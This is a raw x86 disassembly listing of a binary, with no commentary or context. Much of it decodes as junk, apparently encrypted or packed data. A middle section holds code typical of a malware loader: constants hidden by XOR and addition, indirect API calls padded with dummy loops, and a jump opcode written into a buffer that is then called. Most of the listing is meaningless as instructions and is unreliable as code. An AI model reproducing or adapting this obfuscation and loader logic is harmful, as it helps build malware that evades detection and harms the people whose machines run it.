  406eeb:	shr    BYTE PTR [ecx],cl
  406eed:	xor    ah,BYTE PTR [ebx-0xc]
  406ef0:	push   0xc63907b0
  406ef5:	pop    esi
  406ef6:	push   esp
  406ef7:	push   ss
  406ef8:	push   esp
  406ef9:	add    cl,dh
  406efb:	enter  0xb3b9,0x22
  406eff:	in     al,dx
  406f00:	add    dl,BYTE PTR [ebp-0x2c]
  406f03:	adc    al,0x64
  406f05:	fld    DWORD PTR [esi]
  406f07:	xchg   esp,eax
  406f08:	or     al,0xff
  406f0a:	cli    
  406f0b:	(bad)  
  406f0c:	cld    
  406f0d:	mov    cl,0xe7
  406f0f:	adc    eax,0xddb8ee15
  406f14:	pop    esi
  406f15:	(bad)
  406f1a:	fs cli 
  406f1c:	push   edi
  406f1d:	cmc    
  406f1e:	sti    
  406f1f:	loopne 0x406eec
  406f21:	out    0x69,al
  406f23:	mov    al,ds:0xc3470814
  406f28:	fidiv  WORD PTR [edi-0x67]
  406f2b:	mov    fs,WORD PTR [ecx-0x17]
  406f2e:	call   0x9e4a4aee
  406f33:	ins    BYTE PTR es:[edi],dx
  406f34:	repnz mov dh,0x93
  406f37:	ficomp WORD PTR [esi+edi*1-0x5f]
  406f3b:	adc    edi,esi
  406f3d:	pop    edx
  406f3e:	mov    cl,0x7a
  406f40:	pop    es
  406f41:	lea    ebx,ds:0x4aacd77d
  406f47:	and    eax,0x61476863
  406f4c:	sahf   
  406f4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f4e:	add    DWORD PTR [eax],esi
  406f50:	aad    0x69
  406f52:	add    al,0xab
  406f54:	call   0x3e32:0x64e87fdd
  406f5b:	cmp    ebp,DWORD PTR [eax-0x4a61f0fd]
  406f61:	sahf   
  406f62:	xchg   DWORD PTR [ecx+0x64980147],ecx
  406f68:	call   0xc4e7bd99
  406f6d:	adc    BYTE PTR [edx],ah
  406f6f:	in     eax,dx
  406f70:	xchg   ecx,eax
  406f71:	add    eax,0xa3fe7fb
  406f76:	sub    BYTE PTR [edi],al
  406f78:	jb     0x406f04
  406f7a:	xchg   BYTE PTR [esi-0x2],bl
  406f7d:	icebp  
  406f7e:	inc    DWORD PTR [edx+0x21]
  406f81:	(bad)  
  406f82:	cmp    ebx,DWORD PTR [ebp+esi*1-0x6a]
  406f86:	fs out 0x7,al
  406f89:	test   BYTE PTR [edx+0x45],bh
  406f8c:	mov    bl,0x7b
  406f8e:	jae    0x406f13
  406f90:	jg     0x406fc2
  406f92:	pop    ds
  406f93:	push   edi
  406f94:	fistp  DWORD PTR [eax]
  406f96:	jbe    0x406f26
  406f98:	xor    ah,BYTE PTR [ebx-0x2f]
  406f9b:	mov    bl,0xc0
  406f9d:	(bad)  
  406f9e:	xchg   ebx,eax
  406f9f:	int3   
  406fa0:	inc    esp
  406fa1:	jge    0x406fbc
  406fa3:	mov    gs,esi
  406fa5:	lds    edi,FWORD PTR [esi]
  406fa7:	inc    ebx
  406fa8:	add    cl,BYTE PTR [eiz*2+0x2e129f08]
  406faf:	(bad)  
  406fb1:	data16 std 
  406fb3:	mov    dh,BYTE PTR [edi]
  406fb5:	sbb    al,0x51
  406fb7:	jns    0x406f86
  406fb9:	sbb    al,0xbd
  406fbb:	push   ebx
  406fbc:	mov    esi,0x1a093bdc
  406fc1:	sti    
  406fc2:	cmp    al,0x8a
  406fc4:	sbb    eax,0x5410b66a
  406fc9:	xor    al,0x75
  406fcb:	fimul  DWORD PTR [ebp-0x26]
  406fce:	mov    fs,WORD PTR [esp+edx*4+0x40]
  406fd2:	jae    0x406fe1
  406fd4:	enter  0x4875,0x31
  406fd8:	arpl   WORD PTR [esi-0x402da085],sp
  406fde:	push   ebp
  406fdf:	inc    ebx
  406fe0:	mov    cl,0xb3
  406fe2:	jno    0x406f69
  406fe4:	in     eax,0xd0
  406fe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fe7:	add    eax,0x2ec51cb8
  406fec:	pop    esp
  406fed:	sbb    esi,eax
  406fef:	and    eax,0x87b6df5c
  406ff4:	sbb    ebp,esi
  406ff6:	push   ebx
  406ff7:	jae    0x40700c
  406ff9:	or     ch,cl
  406ffb:	jle    0x406f85
  406ffd:	adc    eax,0xf2ec9cd0
  407002:	mov    ds,edx
  407004:	in     al,dx
  407005:	push   0x3ae1383a
  40700a:	repz and DWORD PTR [ebx+0x3cac02e4],ebx
  407011:	gs jno 0x40703a
  407014:	add    eax,0x1a981af0
  407019:	and    eax,0x43165223
  40701e:	push   esp
  40701f:	aam    0xfe
  407021:	adc    eax,0x354081bc
  407026:	jo     0x407071
  407028:	pop    ss
  407029:	dec    BYTE PTR ds:0xf1601d09
  40702f:	dec    edx
  407030:	pop    ebp
  407031:	and    bl,0x9f
  407034:	sub    bl,BYTE PTR [eax]
  407036:	clc    
  407037:	mov    dh,0xb5
  407039:	sbb    dl,dl
  40703b:	lock fs and ah,ch
  40703f:	jo     0x4070a6
  407041:	push   ecx
  407042:	xor    BYTE PTR [edx],0xa0
  407045:	dec    esp
  407046:	dec    ebp
  407047:	inc    ebp
  407048:	push   esi
  407049:	ins    DWORD PTR es:[edi],dx
  40704a:	push   ds
  40704b:	pop    eax
  40704c:	cmp    ecx,DWORD PTR [edx+0x24]
  40704f:	add    DWORD PTR [eax-0x6],edx
  407052:	add    ch,BYTE PTR [ebx+0x7412afce]
  407058:	lds    edx,FWORD PTR [eax-0x78]
  40705b:	cmp    al,0x8e
  40705d:	aaa    
  40705e:	xchg   ecx,eax
  40705f:	jecxz  0x4070ae
  407061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407062:	inc    ecx
  407063:	push   ss
  407064:	popf   
  407065:	adc    al,0x6e
  407067:	lods   eax,DWORD PTR ds:[esi]
  407068:	(bad)  
  40706b:	push   ebp
  40706c:	jae    0x40708a
  40706e:	mov    esp,0xa38734e4
  407073:	dec    ebx
  407074:	mov    WORD PTR [edi+eax*1-0x18d5b65e],cs
  40707b:	sbb    al,0x48
  40707d:	jb     0x407078
  40707f:	mov    ds:0x90237628,al
  407084:	imul   ecx,DWORD PTR [ebx-0x2a0582c0],0xffffffeb
  40708b:	dec    edi
  40708c:	dec    eax
  40708d:	rcr    edx,1
  40708f:	cmc    
  407090:	adc    DWORD PTR [edi-0x3c6c65ab],ebx
  407096:	sub    BYTE PTR [ebp+0x1b0feca3],bl
  40709c:	add    DWORD PTR [ebp+0x2b],ecx
  40709f:	sbb    BYTE PTR [ebx+0x18dfe2be],al
  4070a5:	mov    ch,0xbc
  4070a7:	mov    eax,ds:0xfd990b85
  4070ac:	cdq    
  4070ad:	loopne 0x407112
  4070af:	inc    edi
  4070b0:	push   0x39e59c19
  4070b5:	ds shl edi,1
  4070b8:	xor    edx,DWORD PTR [ecx+0x6b]
  4070bb:	pop    ebx
  4070bc:	jns    0x407090
  4070be:	es pop esp
  4070c0:	add    dh,ah
  4070c2:	(bad)  
  4070c4:	cwde   
  4070c5:	xor    BYTE PTR [esi-0x33],0xce
  4070c9:	test   DWORD PTR [ebx+edi*1],ebp
  4070cc:	sbb    eax,0xa1834670
  4070d1:	adc    ecx,0x2062a992
  4070d7:	icebp  
  4070d8:	lods   al,BYTE PTR ds:[esi]
  4070d9:	nop
  4070da:	call   FWORD PTR [ebx+eiz*4-0x27e01005]
  4070e1:	pop    eax
  4070e2:	stos   DWORD PTR es:[edi],eax
  4070e3:	adc    BYTE PTR [esi-0x57],bh
  4070e6:	push   ss
  4070e7:	lahf   
  4070e8:	imul   edx,DWORD PTR [edx+eax*4-0xa],0x5a
  4070ed:	pusha  
  4070ee:	mov    ds:0xd6c4a50a,eax
  4070f3:	jle    0x407160
  4070f5:	xchg   edi,eax
  4070f6:	(bad)  [esi-0x59]
  4070f9:	sahf   
  4070fa:	mov    dl,BYTE PTR [edi-0x41]
  4070fd:	add    DWORD PTR [ecx+0x25346ad7],esi
  407103:	sti    
  407104:	fnstsw WORD PTR [esi+0x53]
  407107:	jle    0x4070b2
  407109:	sub    al,0xa3
  40710b:	(bad)  
  40710c:	push   edx
  40710d:	xchg   ebx,eax
  40710e:	pop    ds
  40710f:	in     al,0x83
  407111:	inc    edi
  407112:	repnz mov eax,ds:0xe2ccc81a
  407118:	lods   al,BYTE PTR ds:[esi]
  407119:	in     al,0x47
  40711b:	and    eax,0x9434d317
  407120:	in     al,dx
  407121:	or     bh,BYTE PTR [edx+0x43]
  407124:	or     al,0x5d
  407126:	loopne 0x407101
  407128:	icebp  
  407129:	daa    
  40712a:	test   BYTE PTR [esi-0x6e],dl
  40712d:	sbb    BYTE PTR [ecx],ch
  40712f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407130:	and    DWORD PTR [edx],edx
  407132:	add    ebp,DWORD PTR [ecx+0x3280c98d]
  407138:	loope  0x40719b
  40713a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40713b:	pop    es
  40713c:	paddsb mm0,mm7
  40713f:	add    cl,ah
  407141:	imul   ebp,DWORD PTR [edx-0x18],0x41
  407145:	int3   
  407146:	sti    
  407147:	pop    esp
  407148:	test   BYTE PTR [ecx],ah
  40714a:	mov    ds:0x45de4f2,eax
  40714f:	fcmovb st,st(1)
  407151:	scas   al,BYTE PTR es:[edi]
  407152:	jae    0x4070e4
  407154:	call   0x3b70:0x71a52ae7
  40715b:	or     al,0xa5
  40715d:	lds    edx,FWORD PTR [edi]
  40715f:	retf   
  407160:	inc    eax
  407161:	or     eax,0x939beea1
  407166:	call   0x3f2efff5
  40716b:	pop    ecx
  40716c:	jo     0x407145
  40716e:	add    ecx,DWORD PTR es:[ebp-0x304054b0]
  407175:	shld   DWORD PTR ds:0x8d7059f6,edx,cl
  40717c:	adc    al,0x6d
  40717e:	cs pusha 
  407180:	dec    ebx
  407181:	sar    esi,cl
  407183:	clc    
  407184:	in     eax,0xe1
  407186:	mov    al,0x21
  407188:	pop    edx
  407189:	cmc    
  40718a:	mov    es,WORD PTR [edi+0x25]
  40718d:	or     ebp,DWORD PTR [esi]
  40718f:	mov    edx,0x3cef72cd
  407194:	fwait
  407195:	nop
  407196:	cmc    
  407197:	push   es
  407198:	shl    DWORD PTR [ebx-0x3e073a9e],0x41
  40719f:	push   ebp
  4071a0:	mov    BYTE PTR [ecx+0x1b],cl
  4071a3:	push   0xffffff9d
  4071a5:	ret    
  4071a6:	sti    
  4071a7:	les    esi,FWORD PTR [ebp-0x2d]
  4071aa:	xchg   esi,eax
  4071ab:	inc    ebp
  4071ac:	xchg   DWORD PTR [ecx],esi
  4071ae:	mov    al,ds:0xf465bd4c
  4071b3:	in     eax,dx
  4071b4:	dec    edx
  4071b5:	push   esi
  4071b6:	pop    es
  4071b7:	mov    ds:0x994b7a6f,al
  4071bc:	dec    eax
  4071bd:	lahf   
  4071be:	popf   
  4071bf:	sbb    al,0x4a
  4071c1:	mov    ecx,0xf275a476
  4071c6:	mov    ss,edx
  4071c8:	jecxz  0x407161
  4071ca:	clc    
  4071cb:	fidivr DWORD PTR [edi-0x56]
  4071ce:	inc    esi
  4071cf:	dec    ecx
  4071d0:	dec    cl
  4071d2:	dec    sp
  4071d4:	pop    ss
  4071d5:	daa    
  4071d6:	cmp    al,0x9b
  4071d8:	int    0xc0
  4071da:	in     eax,dx
  4071db:	aad    0xfd
  4071dd:	test   DWORD PTR [ecx-0x29],ebx
  4071e0:	outs   dx,BYTE PTR ds:[esi]
  4071e1:	and    BYTE PTR [edi+esi*2+0x60caedb],bh
  4071e8:	in     eax,dx
  4071e9:	shl    BYTE PTR [ebx+0x27a5a952],0xe8
  4071f0:	imul   edi,DWORD PTR [eax+0x694e832c],0xffffffef
  4071f7:	add    BYTE PTR [si],bl
  4071fa:	or     ebx,ecx
  4071fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071fd:	cmp    eax,DWORD PTR [eax+0x18]
  407200:	mov    BYTE PTR [edx+ebx*8-0x7],dl
  407204:	lock pop ds
  407206:	adc    BYTE PTR [ebp+0x7af1dc12],ah
  40720c:	or     eax,0x8245d37f
  407211:	pop    esp
  407212:	xor    eax,ecx
  407214:	mov    edx,0x3272dd
  407219:	add    eax,edx
  40721b:	mov    DWORD PTR [ebp+0x8],eax
  40721e:	mov    eax,DWORD PTR [ebp-0x14]
  407221:	xor    eax,ecx
  407223:	add    eax,edx
  407225:	mov    edx,DWORD PTR [ebp+0x14]
  407228:	imul   eax,DWORD PTR [edx]
  40722b:	mov    edx,DWORD PTR [ebp-0x4]
  40722e:	xor    edx,ecx
  407230:	mov    ecx,DWORD PTR [ebp+0x8]
  407233:	lea    ecx,[edx+ecx*1+0x3272dd]
  40723a:	cmp    ecx,eax
  40723c:	je     0x4072b3
  407242:	mov    edi,DWORD PTR [ebp-0x14]
  407245:	mov    eax,DWORD PTR [ebp+0x8]
  407248:	mov    edx,DWORD PTR [ebp+0x14]
  40724b:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40724f:	mov    ecx,0x7510896
  407254:	xor    edx,edx
  407256:	xor    edi,ecx
  407258:	mov    esi,0x3272dd
  40725d:	add    edi,esi
  40725f:	div    edi
  407261:	mov    edx,DWORD PTR [ebp-0x4]
  407264:	xor    edx,ecx
  407266:	lea    eax,[edx+eax*1+0x3272dd]
  40726d:	mov    edx,DWORD PTR [ebp+0x8]
  407270:	mov    edi,DWORD PTR [ebp-0x20]
  407273:	mov    DWORD PTR [edi+edx*4],eax
  407276:	mov    eax,DWORD PTR [ebp-0x14]
  407279:	mov    edx,DWORD PTR [ebp+0x8]
  40727c:	xor    eax,ecx
  40727e:	lea    eax,[eax+edx*1+0x3272dd]
  407285:	mov    DWORD PTR [ebp+0x8],eax
  407288:	mov    eax,DWORD PTR [ebp-0x14]
  40728b:	mov    edx,DWORD PTR [ebp+0x14]
  40728e:	xor    eax,ecx
  407290:	add    eax,esi
  407292:	imul   eax,DWORD PTR [edx]
  407295:	mov    edx,DWORD PTR [ebp-0x4]
  407298:	xor    edx,ecx
  40729a:	mov    ecx,DWORD PTR [ebp+0x8]
  40729d:	lea    ecx,[edx+ecx*1+0x3272dd]
  4072a4:	cmp    ecx,eax
  4072a6:	jne    0x407242
  4072ac:	mov    eax,esi
  4072ae:	jmp    0x4072b8
  4072b3:	mov    eax,0x3272dd
  4072b8:	mov    ebx,0x7510896
  4072bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4072c0:	xor    ecx,ebx
  4072c2:	add    ecx,eax
  4072c4:	mov    DWORD PTR [ebp-0xc],ecx
  4072c7:	mov    ebx,0x65655
  4072cc:	add    ebx,0x3234
  4072d2:	xchg   ebx,esi
  4072d4:	xor    ebx,ebx
  4072d6:	push   esi
  4072d7:	mov    esi,ebx
  4072d9:	pop    ebx
  4072da:	mov    edx,esi
  4072dc:	add    ebx,0x1002
  4072e2:	lea    eax,[ebp-0x10]
  4072e5:	add    edx,eax
  4072e7:	add    edx,0x5
  4072ea:	push   edx
  4072eb:	inc    esi
  4072ec:	pop    ecx
  4072ed:	dec    ecx
  4072ee:	xchg   ecx,eax
  4072ef:	dec    eax
  4072f0:	xchg   ecx,eax
  4072f1:	dec    ecx
  4072f2:	xchg   ecx,edx
  4072f4:	dec    edx
  4072f5:	push   edx
  4072f6:	mov    edx,ebx
  4072f8:	pop    ebx
  4072f9:	dec    ebx
  4072fa:	call   DWORD PTR [ebx]
  4072fc:	cmp    DWORD PTR [ebp+0x10],esi
  4072ff:	je     0x40731e
  407305:	xchg   edx,eax
  407306:	push   0xb
  407308:	pop    ecx
  407309:	push   0x4
  40730b:	pop    ebx
  40730c:	inc    ebx
  40730d:	xchg   ebx,ecx
  40730f:	sub    ebx,ecx
  407311:	xchg   ebx,ecx
  407313:	dec    ecx
  407314:	dec    ecx
  407315:	mov    eax,DWORD PTR [ebp-0x1c]
  407318:	imul   eax,ecx
  40731b:	add    esp,eax
  40731d:	xchg   edx,eax
  40731e:	push   eax
  40731f:	xor    ebx,ebx
  407321:	mov    edx,esp
  407323:	dec    edx
  407324:	inc    ebx
  407325:	add    ebx,DWORD PTR [edx+ebx*1]
  407328:	dec    ebx
  407329:	xor    edx,edx
  40732b:	add    DWORD PTR [ebp-0xc],ebx
  40732e:	pop    ebx
  40732f:	mov    eax,DWORD PTR [ebp-0xc]
  407332:	pop    edi
  407333:	pop    esi
  407334:	pop    ebx
  407335:	leave  
  407336:	ret    0x10
  407339:	push   ebp
  40733a:	mov    ebp,esp
  40733c:	sub    esp,0x7c
  40733f:	and    DWORD PTR ds:0x420e92,0x0
  407349:	jmp    0x40735b
  40734e:	mov    ecx,DWORD PTR ds:0x420e92
  407354:	inc    ecx
  407355:	mov    DWORD PTR ds:0x420e92,ecx
  40735b:	cmp    DWORD PTR ds:0x420e92,0x15
  407362:	jae    0x4073cc
  407368:	cmp    DWORD PTR ds:0x420e92,0x1f
  40736f:	jne    0x407388
  407375:	push   0x3dd4
  40737a:	push   0x422018
  40737f:	push   DWORD PTR [ebp-0xc]
  407382:	call   DWORD PTR ds:0x4247e5
  407388:	jmp    0x40734e
  40738d:	mov    DWORD PTR ds:0x420f64,0x1c
  407397:	cmp    DWORD PTR ds:0x420f64,0x0
  40739e:	je     0x4073cc
  4073a4:	cmp    DWORD PTR ds:0x420f64,0x1d
  4073ab:	jne    0x4073b7
  4073b1:	call   DWORD PTR ds:0x4247f1
  4073b7:	mov    eax,ds:0x420f64
  4073bc:	dec    eax
  4073bd:	mov    ds:0x420f64,eax
  4073c2:	jmp    0x407397
  4073c7:	adc    eax,0x653
  4073cc:	push   esi
  4073cd:	and    DWORD PTR ds:0x42200c,0x0
  4073d7:	jmp    0x4073e9
  4073dc:	mov    esi,DWORD PTR ds:0x42200c
  4073e2:	inc    esi
  4073e3:	mov    DWORD PTR ds:0x42200c,esi
  4073e9:	cmp    DWORD PTR ds:0x42200c,0x16
  4073f0:	jae    0x40742e
  4073f6:	cmp    DWORD PTR ds:0x42200c,0xa
  4073fd:	jne    0x407409
  407403:	call   DWORD PTR ds:0x4247f5
  407409:	cmp    DWORD PTR ds:0x42200c,0x9
  407410:	jne    0x407423
  407416:	mov    esi,DWORD PTR ds:0x42200c
  40741c:	inc    esi
  40741d:	mov    DWORD PTR ds:0x42200c,esi
  407423:	jmp    0x4073dc
  407428:	sbb    DWORD PTR ds:0x420f00,edx
  40742e:	push   edi
  40742f:	mov    eax,ds:0x424435
  407434:	mov    DWORD PTR ds:0x420f70,0x12
  40743e:	cmp    DWORD PTR ds:0x420f70,0x0
  407445:	je     0x40748b
  40744b:	cmp    DWORD PTR ds:0x420f70,0x17
  407452:	jne    0x407479
  407458:	push   0x87b3
  40745d:	push   DWORD PTR [ebp-0x28]
  407460:	push   0x420f68
  407465:	push   0x7b70
  40746a:	push   DWORD PTR [ebp-0x18]
  40746d:	push   DWORD PTR [ebp-0x24]
  407470:	push   DWORD PTR [ebp-0x14]
  407473:	call   DWORD PTR ds:0x4247f9
  407479:	mov    edi,DWORD PTR ds:0x420f70
  40747f:	dec    edi
  407480:	mov    DWORD PTR ds:0x420f70,edi
  407486:	jmp    0x40743e
  40748b:	mov    DWORD PTR [ebp-0x24],eax
  40748e:	mov    eax,ds:0x424541
  407493:	xor    esi,edi
  407495:	mov    DWORD PTR [ebp-0x34],eax
  407498:	and    edi,DWORD PTR ds:0x420f5c
  40749e:	and    DWORD PTR [ebp-0x30],0x0
  4074a2:	and    eax,edi
  4074a4:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  4074ab:	adc    DWORD PTR ds:0x420ef0,edx
  4074b1:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  4074b8:	mov    edi,DWORD PTR ds:0x420ec2
  4074be:	mov    eax,ds:0x420f7c
  4074c3:	sub    edi,eax
  4074c5:	sub    edi,DWORD PTR [edi+eax*1]
  4074c8:	mov    eax,DWORD PTR [ebp-0x10]
  4074cb:	or     edi,0x1b5b
  4074d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4074d4:	and    DWORD PTR ds:0x420ea2,0x0
  4074de:	xor    esi,esi
  4074e0:	xor    esi,DWORD PTR ds:0x420ea2
  4074e6:	inc    esi
  4074e7:	mov    DWORD PTR ds:0x420ea2,esi
  4074ed:	cmp    DWORD PTR ds:0x420ea2,0x20
  4074f4:	jne    0x407508
  4074fa:	push   DWORD PTR [ebp-0x28]
  4074fd:	push   0x424093
  407502:	call   DWORD PTR ds:0x4247fd
  407508:	cmp    DWORD PTR ds:0x420ea2,0x19
  40750f:	jb     0x4074de
  407515:	sub    eax,ecx
  407517:	and    DWORD PTR ds:0x420fac,0x0
  407521:	xor    ecx,ecx
  407523:	or     ecx,DWORD PTR ds:0x420fac
  407529:	inc    ecx
  40752a:	mov    DWORD PTR ds:0x420fac,ecx
  407530:	cmp    DWORD PTR ds:0x420fac,0x5
  407537:	jne    0x407550
  40753d:	push   0x42414e
  407542:	push   0x0
  407544:	push   DWORD PTR [ebp-0x28]
  407547:	push   DWORD PTR [ebp-0x10]
  40754a:	call   DWORD PTR ds:0x424801
  407550:	cmp    DWORD PTR ds:0x420fac,0x4
  407557:	jne    0x40756a
  40755d:	mov    ecx,DWORD PTR ds:0x420fac
  407563:	inc    ecx
  407564:	mov    DWORD PTR ds:0x420fac,ecx
  40756a:	cmp    DWORD PTR ds:0x420fac,0x16
  407571:	jb     0x407521
  407577:	and    DWORD PTR ds:0x420f9c,0x0
  407581:	jmp    0x407593
  407586:	mov    ecx,DWORD PTR ds:0x420f9c
  40758c:	inc    ecx
  40758d:	mov    DWORD PTR ds:0x420f9c,ecx
  407593:	cmp    DWORD PTR ds:0x420f9c,0x11
  40759a:	jae    0x4075dc
  4075a0:	cmp    DWORD PTR ds:0x420f9c,0x5
  4075a7:	jne    0x4075bd
  4075ad:	push   0x420f74
  4075b2:	push   0x1cd6
  4075b7:	call   DWORD PTR ds:0x424805
  4075bd:	cmp    DWORD PTR ds:0x420f9c,0x4
  4075c4:	jne    0x4075d7
  4075ca:	mov    ecx,DWORD PTR ds:0x420f9c
  4075d0:	inc    ecx
  4075d1:	mov    DWORD PTR ds:0x420f9c,ecx
  4075d7:	jmp    0x407586
  4075dc:	mov    DWORD PTR [ebp-0x10],eax
  4075df:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  4075e6:	mov    eax,DWORD PTR [ebp-0x18]
  4075e9:	mov    ecx,DWORD PTR [ebp-0x18]
  4075ec:	sub    eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x18],eax
  4075f1:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4075f8:	mov    eax,DWORD PTR [ebp-0xc]
  4075fb:	mov    ecx,DWORD PTR [ebp-0xc]
  4075fe:	sub    eax,ecx
  407600:	mov    DWORD PTR [ebp-0xc],eax
  407603:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  40760a:	mov    eax,DWORD PTR [ebp-0x1c]
  40760d:	mov    ecx,DWORD PTR [ebp-0x1c]
  407610:	sub    eax,ecx
  407612:	mov    DWORD PTR [ebp-0x1c],eax
  407615:	or     DWORD PTR [ebp-0x1c],0xf89c85d5
  40761c:	mov    eax,DWORD PTR [ebp-0x20]
  40761f:	mov    ecx,DWORD PTR [ebp-0x20]
  407622:	sub    eax,ecx
  407624:	mov    DWORD PTR [ebp-0x20],eax
  407627:	mov    eax,DWORD PTR [ebp-0x2c]
  40762a:	mov    ecx,DWORD PTR [ebp-0x20]
  40762d:	mov    esi,0x7510896
  407632:	xor    eax,esi
  407634:	mov    edi,0x3272dd
  407639:	add    eax,edi
  40763b:	or     eax,ecx
  40763d:	mov    DWORD PTR [ebp-0x20],eax
  407640:	mov    eax,DWORD PTR [ebp-0x4]
  407643:	mov    ecx,DWORD PTR [ebp-0x4]
  407646:	sub    eax,ecx
  407648:	mov    DWORD PTR [ebp-0x4],eax
  40764b:	or     DWORD PTR [ebp-0x4],0xf89c85be
  407652:	mov    eax,DWORD PTR [ebp-0xc]
  407655:	xor    eax,esi
  407657:	add    eax,edi
  407659:	push   eax
  40765a:	mov    eax,DWORD PTR [ebp-0x10]
  40765d:	xor    eax,esi
  40765f:	add    eax,edi
  407661:	push   eax
  407662:	mov    eax,DWORD PTR [ebp-0x4]
  407665:	xor    eax,esi
  407667:	add    eax,edi
  407669:	push   eax
  40766a:	lea    eax,[ebp-0x7c]
  40766d:	push   eax
  40766e:	push   DWORD PTR [ebp-0x2c]
  407671:	push   DWORD PTR [ebp-0x28]
  407674:	call   0x410b90
  407679:	test   eax,eax
  40767b:	je     0x4076a9
  407681:	lea    eax,[ebp-0x7c]
  407684:	push   eax
  407685:	mov    eax,DWORD PTR [ebp-0x28]
  407688:	xor    eax,esi
  40768a:	add    eax,edi
  40768c:	push   eax
  40768d:	mov    eax,DWORD PTR [ebp-0x24]
  407690:	add    eax,0xaa
  407695:	push   eax
  407696:	mov    eax,DWORD PTR [ebp-0x24]
  407699:	mov    eax,DWORD PTR [eax+0x198]
  40769f:	push   DWORD PTR [eax]
  4076a1:	call   0x402470
  4076a6:	mov    DWORD PTR [ebp-0x14],eax
  4076a9:	lea    eax,[ebp+0x4]
  4076ac:	mov    DWORD PTR [ebp-0x30],eax
  4076af:	mov    eax,DWORD PTR [ebp-0x14]
  4076b2:	test   eax,eax
  4076b4:	je     0x40771c
  4076ba:	lea    eax,[ebp-0x8]
  4076bd:	mov    DWORD PTR [ebp-0x38],eax
  4076c0:	mov    eax,DWORD PTR [ebp-0x34]
  4076c3:	mov    DWORD PTR [ebp-0x8],eax
  4076c6:	mov    eax,DWORD PTR [ebp-0x8]
  4076c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4076cc:	sub    eax,ecx
  4076ce:	mov    DWORD PTR [ebp-0x8],eax
  4076d1:	mov    ecx,DWORD PTR [ebp-0x4]
  4076d4:	xor    ecx,esi
  4076d6:	mov    eax,0xffcd8d23
  4076db:	sub    eax,ecx
  4076dd:	add    DWORD PTR [ebp-0x8],eax
  4076e0:	mov    eax,DWORD PTR [ebp-0x8]
  4076e3:	mov    ecx,DWORD PTR [ebp-0x14]
  4076e6:	mov    DWORD PTR [ecx+0x1],eax
  4076e9:	mov    eax,DWORD PTR [ebp-0x14]
  4076ec:	push   DWORD PTR [ebp-0x24]
  4076ef:	mov    BYTE PTR [eax],0xe9
  4076f2:	mov    eax,ds:0x4242b1
  4076f7:	push   DWORD PTR [eax]
  4076f9:	push   DWORD PTR ds:0x42450d
  4076ff:	push   DWORD PTR ds:0x4242b9
  407705:	push   DWORD PTR ds:0x4244ed
  40770b:	push   DWORD PTR ds:0x4245a5
  407711:	push   DWORD PTR [ebp-0x28]
  407714:	push   DWORD PTR [ebp-0x2c]
  407717:	mov    eax,DWORD PTR [ebp-0x14]
  40771a:	call   eax
  40771c:	mov    eax,DWORD PTR [ebp-0x30]
  40771f:	mov    ecx,DWORD PTR ds:0x4244b1
  407725:	add    DWORD PTR [eax],ecx
  407727:	pop    edi
  407728:	pop    esi
  407729:	leave  
  40772a:	ret    
  40772b:	push   ebp
  40772c:	mov    ebp,esp
  40772e:	sub    esp,0x18
  407731:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  407738:	lea    eax,[ebp+0x14]
  40773b:	mov    DWORD PTR [ebp-0x4],eax
  40773e:	jmp    0x409ab8
  407743:	das    
  407744:	or     DWORD PTR [eax+0x13b778ea],edx
  40774a:	mov    esp,DWORD PTR [esi-0x10]
  40774d:	in     eax,0x6d
  40774f:	sbb    DWORD PTR [ebx+edx*1+0x5c],0x7a7a209a
  407757:	sbb    DWORD PTR [edi+0x7a],ebx
  40775a:	jp     0x40771f
  40775c:	leave  
  40775d:	mov    esp,0x11d78622
  407762:	add    bh,BYTE PTR [ecx-0x741ea72f]
  407768:	push   ss
  407769:	xchg   ecx,eax
  40776a:	mov    ecx,0x4571dbff
  40776f:	sub    ch,cl
  407771:	mov    cl,ch
  407773:	push   0x77b6dde1
  407778:	jns    0x407714
  40777a:	sbb    edx,DWORD PTR [ebx+ebx*4+0x7d]
  40777e:	mov    ch,0xd2
  407780:	cmp    esi,ecx
  407782:	into   
  407783:	and    cl,BYTE PTR [ecx+0x462781c6]
  407789:	imul   ecx,DWORD PTR [ecx-0x915d1ef],0xffffffb4
  407790:	inc    ebp
  407791:	xchg   ecx,eax
  407792:	push   esp
  407793:	cwde   
  407794:	xor    al,0x1f
  407796:	xor    ah,bl
  407798:	adc    edi,DWORD PTR [ebx]
  40779a:	imul   ecx,esp,0xffffff80
  40779d:	call   0x2bdd:0x8ff8fcde
  4077a4:	adc    dl,BYTE PTR [ebx]
  4077a6:	arpl   sp,ax
  4077a8:	cmp    al,ah
  4077aa:	add    dl,cl
  4077ac:	daa    
  4077ad:	xchg   ecx,eax
  4077ae:	xchg   esi,eax
  4077af:	js     0x4077af
  4077b1:	out    0x78,eax
  4077b3:	dec    ebx
  4077b4:	push   ss
  4077b5:	aam    0xfc
  4077b7:	adc    eax,0x6317467d
  4077bc:	xor    ebp,esp
  4077be:	int    0x41
  4077c0:	or     al,ch
  4077c2:	loop   0x407826
  4077c4:	out    0x6e,al
  4077c6:	mov    eax,edx
  4077c8:	loope  0x40778e
  4077ca:	add    DWORD PTR [ebp-0x3d],esp
  4077cd:	jl     0x40776a
  4077cf:	cmp    eax,0x6d9b7e9d
  4077d4:	push   ecx
  4077d5:	mov    dh,0x6b
  4077d7:	loopne 0x40781b
  4077d9:	xor    ah,BYTE PTR [ebp+ebp*8-0x46]
  4077dd:	sub    BYTE PTR [ebx+0x14],al
  4077e0:	(bad)  
  4077e1:	add    ecx,esp
  4077e3:	jne    0x407818
  4077e5:	iret   
  4077e6:	sbb    ecx,DWORD PTR [ebx-0xe937884]
  4077ec:	or     bl,bl
  4077ee:	inc    edx
